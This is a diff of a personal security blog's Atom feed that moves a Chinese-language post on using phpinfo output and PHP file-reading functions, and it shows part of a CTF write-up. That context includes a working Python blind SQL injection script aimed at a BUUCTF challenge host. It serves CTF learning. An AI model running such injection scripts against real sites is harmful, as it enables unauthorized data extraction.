@@ -3,88 +3,7 @@
     <id>https://my011215.github.io</id>
     <title>blog小窝</title>
     <link href="https://my011215.github.io" />
-    <updated>2022-12-09T10:27:30.000Z</updated>
-    <entry>
-        <id>https://my011215.github.io/2022/12/09/vulnerability/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/</id>
-        <title>php信息利用</title>
-        <link rel="alternate" href="https://my011215.github.io/2022/12/09/vulnerability/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/"/>
-        <content type="html">&lt;!-- toc --&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#phpinfo%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8&#34;&gt;phpinfo 页面信息利用&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#php%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%87%BD%E6%95%B0&#34;&gt;php 读取文件函数&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;!-- tocstop --&gt;
-&lt;h2&gt;&lt;span id=&#34;phpinfo-页面信息利用&#34;&gt; phpinfo 页面信息利用&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;参考：&lt;a href=&#34;https://www.secpulse.com/archives/117762.html&#34;&gt;https://www.secpulse.com/archives/117762.html&lt;/a&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;system&lt;br&gt;
- 获取操作系统具体版本，提权&lt;br&gt;
-&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/187.png?raw=true&#34; alt&gt;&lt;/li&gt;
-&lt;li&gt;Server API	&lt;br&gt;
-依稀记得做题用到这个条件限制，记不太清楚了…&lt;/li&gt;
-&lt;li&gt;Registered PHP Streams&lt;br&gt;
- 已注册的 PHP 流&lt;br&gt;
-可以利用 php 伪协议&lt;br&gt;
-&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/188.png?raw=true&#34; alt&gt;&lt;/li&gt;
-&lt;li&gt;Registered Stream Filters&lt;br&gt;
- 可使用的过滤器&lt;br&gt;
-&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/189.png?raw=true&#34; alt&gt;&lt;/li&gt;
-&lt;li&gt;伪协议利用条件&lt;br&gt;
- allow_url_fopen	&lt;br&gt;
-allow_url_include&lt;/li&gt;
-&lt;li&gt;extension_dir&lt;br&gt;
-php 扩展的路径&lt;/li&gt;
-&lt;li&gt;disable_functions&lt;br&gt;
- 禁用函数列表&lt;/li&gt;
-&lt;li&gt;open_basedir&lt;br&gt;
- 将用户可操作的文件限制在某目录下&lt;/li&gt;
-&lt;/ol&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
-&lt;h2&gt;&lt;span id=&#34;php-读取文件函数&#34;&gt; php 读取文件函数&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;参考：&lt;a href=&#34;http://t.csdn.cn/ZPksp&#34;&gt;http://t.csdn.cn/ZPksp&lt;/a&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file_get_contents   // *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fread&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fgets&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fgetss&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parse_ini_file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readfile    // *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highlight_file  // *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show_source // *&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ul&gt;
-&lt;li&gt;用法&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ol&gt;
-&lt;li&gt;file_get_contents&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo file_get_contents(&amp;#x27;flag.txt&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ol start=&#34;2&#34;&gt;
-&lt;li&gt;fread&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$file = fopen(&amp;quot;flag.txt&amp;quot;,&amp;quot;rb&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo fread($file,1024);     // 参数为 resource 类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fclose($file);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ol start=&#34;3&#34;&gt;
-&lt;li&gt;fgets&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$file = fopen(&amp;quot;flag.txt&amp;quot;,&amp;quot;rb&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo fread($file,1024);     // 参数为 resource 类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fclose($file);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ol start=&#34;4&#34;&gt;
-&lt;li&gt;fgetss&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$file = fopen(&amp;quot;flag.txt&amp;quot;,&amp;quot;r&amp;quot;);     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo fgetss($file, 4096);        // 过滤掉了 HTML 和 PHP 标签&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fclose($file);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ol start=&#34;5&#34;&gt;
-&lt;li&gt;file&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;print_r(file(&amp;#x27;flag.txt&amp;#x27;)); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ol start=&#34;6&#34;&gt;
-&lt;li&gt;parse_ini_file&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo parse_ini_file(&amp;quot;flag.txt&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ol start=&#34;7&#34;&gt;
-&lt;li&gt;readfile&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo readfile(&amp;quot;flag.txt&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ol start=&#34;8&#34;&gt;
-&lt;li&gt;highlight_file&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;highlight_file(&amp;#x27;flag.txt&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ol start=&#34;9&#34;&gt;
-&lt;li&gt;show_source&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;show_source(&amp;#x27;flag.txt&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-</content>
-        <updated>2022-12-09T10:27:30.000Z</updated>
-    </entry>
+    <updated>2022-12-09T14:47:30.000Z</updated>
     <entry>
         <id>https://my011215.github.io/2022/12/09/CTF/%E5%88%B7%E9%A2%98/</id>
         <title>刷题</title>
@@ -915,7 +834,88 @@ Now, just give the id of passage&lt;br&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import  requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    url = &amp;#x27;http://a97966da-4466-48d1-b5fc-abb1a493628f.node4.buuoj.cn:81/index.php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    flag =&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for i in range(1,50):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for j in range(32,140):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            payload = &amp;#x27;if((ascii(substr((select(flag)from(flag)),&amp;#123;&amp;#125;,1))=&amp;#123;&amp;#125;),1,0)&amp;#x27;.format(i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;quot;id&amp;quot;: payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            res = requests.post(url=url, data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if&amp;#x27;Hello, glzjin wants a girlfriend&amp;#x27; in res.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                flag = flag + chr(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                print(flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                break&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;ok, 成功拿取 flag&lt;/p&gt;
 </content>
-        <updated>2022-12-09T09:27:30.000Z</updated>
+        <updated>2022-12-09T14:47:30.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://my011215.github.io/2022/12/09/vulnerability/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/</id>
+        <title>php信息利用</title>
+        <link rel="alternate" href="https://my011215.github.io/2022/12/09/vulnerability/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/"/>
+        <content type="html">&lt;!-- toc --&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#phpinfo%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8&#34;&gt;phpinfo 页面信息利用&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#php%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%87%BD%E6%95%B0&#34;&gt;php 读取文件函数&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- tocstop --&gt;
+&lt;h2&gt;&lt;span id=&#34;phpinfo-页面信息利用&#34;&gt; phpinfo 页面信息利用&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;参考：&lt;a href=&#34;https://www.secpulse.com/archives/117762.html&#34;&gt;https://www.secpulse.com/archives/117762.html&lt;/a&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;system&lt;br&gt;
+ 获取操作系统具体版本，提权&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/187.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;li&gt;Server API	&lt;br&gt;
+依稀记得做题用到这个条件限制，记不太清楚了…&lt;/li&gt;
+&lt;li&gt;Registered PHP Streams&lt;br&gt;
+ 已注册的 PHP 流&lt;br&gt;
+可以利用 php 伪协议&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/188.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;li&gt;Registered Stream Filters&lt;br&gt;
+ 可使用的过滤器&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/189.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;li&gt;伪协议利用条件&lt;br&gt;
+ allow_url_fopen	&lt;br&gt;
+allow_url_include&lt;/li&gt;
+&lt;li&gt;extension_dir&lt;br&gt;
+php 扩展的路径&lt;/li&gt;
+&lt;li&gt;disable_functions&lt;br&gt;
+ 禁用函数列表&lt;/li&gt;
+&lt;li&gt;open_basedir&lt;br&gt;
+ 将用户可操作的文件限制在某目录下&lt;/li&gt;
+&lt;/ol&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
+&lt;h2&gt;&lt;span id=&#34;php-读取文件函数&#34;&gt; php 读取文件函数&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;参考：&lt;a href=&#34;http://t.csdn.cn/ZPksp&#34;&gt;http://t.csdn.cn/ZPksp&lt;/a&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file_get_contents   // *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fread&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fgets&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fgetss&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parse_ini_file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readfile    // *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highlight_file  // *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show_source // *&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;用法&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;file_get_contents&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo file_get_contents(&amp;#x27;flag.txt&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;fread&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$file = fopen(&amp;quot;flag.txt&amp;quot;,&amp;quot;rb&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo fread($file,1024);     // 参数为 resource 类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fclose($file);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;fgets&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$file = fopen(&amp;quot;flag.txt&amp;quot;,&amp;quot;rb&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo fread($file,1024);     // 参数为 resource 类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fclose($file);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;fgetss&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$file = fopen(&amp;quot;flag.txt&amp;quot;,&amp;quot;r&amp;quot;);     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo fgetss($file, 4096);        // 过滤掉了 HTML 和 PHP 标签&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fclose($file);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;file&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;print_r(file(&amp;#x27;flag.txt&amp;#x27;)); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;parse_ini_file&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo parse_ini_file(&amp;quot;flag.txt&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;7&#34;&gt;
+&lt;li&gt;readfile&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo readfile(&amp;quot;flag.txt&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;8&#34;&gt;
+&lt;li&gt;highlight_file&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;highlight_file(&amp;#x27;flag.txt&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;9&#34;&gt;
+&lt;li&gt;show_source&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;show_source(&amp;#x27;flag.txt&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+</content>
+        <updated>2022-12-09T10:27:30.000Z</updated>
     </entry>
     <entry>
         <id>https://my011215.github.io/2022/12/09/interview/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%9D%A2%E8%AF%95%E9%A2%98/</id>
